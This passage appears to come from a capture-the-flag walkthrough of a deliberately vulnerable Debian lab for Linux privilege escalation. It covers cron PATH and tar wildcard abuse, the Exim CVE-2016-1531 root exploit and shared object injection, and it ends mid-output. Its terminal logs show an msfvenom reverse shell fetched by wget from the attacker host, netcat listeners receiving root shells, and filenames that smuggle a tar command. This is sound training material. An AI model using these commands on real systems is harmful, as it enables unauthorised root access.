class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">kali@kali:~/CTFs/tryhackme/Linux PrivEsc$ nc -nvlp 9001</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">listening on [any] 9001 ...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">connect to [10.8.106.222] from (UNKNOWN) [10.10.206.164] 34650</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bash: no job control in this shell</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@debian:~# whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@debian:~#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol><li>Read and follow along with the above.</li></ol><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="cron-jobs---path-environment-variable">Cron Jobs - PATH Environment Variable<a href="#cron-jobs---path-environment-variable" class="hash-link" aria-label="Direct link to Cron Jobs - PATH Environment Variable" title="Direct link to Cron Jobs - PATH Environment Variable">​</a></h2><p>View the contents of the system-wide crontab:</p><p><code>cat /etc/crontab</code></p><p>Note that the PATH variable starts with /home/user which is our user&#x27;s home directory.</p><p>Create a file called overwrite.sh in your home directory with the following contents:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">#!/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cp /bin/bash /tmp/rootbash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chmod +xs /tmp/rootbash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Make sure that the file is executable:</p><p><code>chmod +x /home/user/overwrite.sh</code></p><p>Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:</p><p><code>/tmp/rootbash -p</code></p><p><strong>Remember to remove the modified code, remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!</strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">rm /tmp/rootbash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol><li>What is the value of the PATH variable in /etc/crontab?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">cat /etc/crontab</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="cron-jobs---wildcards">Cron Jobs - Wildcards<a href="#cron-jobs---wildcards" class="hash-link" aria-label="Direct link to Cron Jobs - Wildcards" title="Direct link to Cron Jobs - Wildcards">​</a></h2><p>View the contents of the other cron job script:</p><p><code>cat /usr/local/bin/compress.sh</code></p><p>Note that the tar command is being run with a wildcard (<!-- -->*<!-- -->) in your home directory.</p><p>Take a look at the GTFOBins page for <a href="https://gtfobins.github.io/gtfobins/tar/" target="_blank" rel="noopener noreferrer">tar</a>. Note that tar has command line options that let you run other commands as part of a checkpoint feature.</p><p>Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:</p><p><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf</code></p><p>Transfer the shell.elf file to <strong>/home/user/</strong> on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use <strong>wget</strong>). Make sure the file is executable:</p><p><code>chmod +x /home/user/shell.elf</code></p><p>Create these two files in /home/user:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">touch /home/user/--checkpoint=1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">touch /home/user/--checkpoint-action=exec=shell.elf</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>When the tar command in the cron job runs, the wildcard (<!-- -->*<!-- -->) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.</p><p>Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.</p><p><code>nc -nvlp 4444</code></p><p><strong>Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:</strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">rm /home/user/shell.elf</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rm /home/user/--checkpoint=1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rm /home/user/--checkpoint-action=exec=shell.elf</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol><li>Read and follow along with the above.</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">kali@kali:~/CTFs/tryhackme/Linux PrivEsc$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.106.222 LPORT=9001 -f elf -o shell.elf</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] No arch selected, selecting arch: x64 from the payload</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">No encoder specified, outputting raw payload</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Payload size: 74 bytes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Final size of elf file: 194 bytes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Saved as: shell.elf</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">kali@kali:~/CTFs/tryhackme/Linux PrivEsc$ sudo python3 -m http.server 80</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">10.10.206.164 - - [30/Sep/2020 15:01:57] &quot;GET /shell.elf HTTP/1.0&quot; 200 -</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ wget http://10.8.106.222/shell.elf</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">--2020-09-30 09:01:58--  http://10.8.106.222/shell.elf</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Connecting to 10.8.106.222:80... connected.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HTTP request sent, awaiting response... 200 OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Length: 194 [application/octet-stream]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Saving to: “shell.elf”</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">100%[====================================================&gt;] 194         --.-K/s   in 0s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020-09-30 09:01:58 (34.0 MB/s) - “shell.elf” saved [194/194]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ chmod +x /home/user/shell.elf</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ touch /home/user/--checkpoint=1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ touch /home/user/--checkpoint-action=exec=shell.elf</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">kali@kali:~/CTFs/tryhackme/Linux PrivEsc$ nc -nvlp 9001listening on [any] 9001 ...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">connect to [10.8.106.222] from (UNKNOWN) [10.10.206.164] 34653</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ rm /home/user/shell.elf</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ rm /home/user/--checkpoint=1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ rm /home/user/--checkpoint-action=exec=shell.elf</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="suid--sgid-executables---known-exploits">SUID / SGID Executables - Known Exploits<a href="#suid--sgid-executables---known-exploits" class="hash-link" aria-label="Direct link to SUID / SGID Executables - Known Exploits" title="Direct link to SUID / SGID Executables - Known Exploits">​</a></h2><p>Find all the SUID/SGID executables on the Debian VM:</p><p><code>find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null</code></p><p>Note that /usr/sbin/exim-4.84-3 appears in the results. Try to find a known exploit for this version of exim. <a href="https://www.exploit-db.com/" target="_blank" rel="noopener noreferrer">Exploit-DB</a>, Google, and GitHub are good places to search!</p><p>A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at <strong>/home/user/tools/suid/exim/cve-2016-1531.sh.</strong></p><p>Run the exploit script to gain a root shell:</p><p><code>/home/user/tools/suid/exim/cve-2016-1531.sh</code></p><p><strong>Remember to exit out of the root shell before continuing!</strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ul><li><a href="https://www.exploit-db.com/exploits/39535" target="_blank" rel="noopener noreferrer">Exim 4.84-3 - Local Privilege Escalation</a></li></ul><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ /home/user/tools/suid/exim/cve-2016-1531.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[ CVE-2016-1531 local root exploit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sh-4.1# whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sh-4.1#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol><li>Read and follow along with the above.</li></ol><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="suid--sgid-executables---shared-object-injection">SUID / SGID Executables - Shared Object Injection<a href="#suid--sgid-executables---shared-object-injection" class="hash-link" aria-label="Direct link to SUID / SGID Executables - Shared Object Injection" title="Direct link to SUID / SGID Executables - Shared Object Injection">​</a></h2><p>The <strong>/usr/local/bin/suid-so</strong> SUID executable is vulnerable to shared object injection.</p><p>First, execute the file and note that currently it displays a progress bar before exiting:</p><p><code>/usr/local/bin/suid-so</code></p><p>Run <strong>strace</strong> on the file and search the output for open/access calls and for &quot;no such file&quot; errors:</p><p><code>strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE &quot;open|access|no such file&quot;</code></p><p>Note that the executable tries to load the <strong>/home/user/.config/libcalc.so</strong> shared object within our home directory, but it cannot be found.</p><p>Create the <strong>.config</strong> directory for the libcalc.so file:</p><p><code>mkdir /home/user/.config</code></p><p>Example shared object code can be found at /home/user/tools/suid/libcalc.c. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:</p><p><code>gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c</code></p><p>Execute the <strong>suid-so</strong> executable again, and note that this time, instead of a progress bar, we get a root shell.</p><p><code>/usr/local/bin/suid-so</code></p><p><strong>Remember to exit out of the root shell before continuing!</strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ /usr/local/bin/suid-so</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Calculating something, please wait...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[=====================================================================&gt;] 99 %</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Done.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE &quot;open|access|no such file&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">access(&quot;/etc/suid-debug&quot;, F_OK)         = -1 ENOENT (No such file or directory)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token 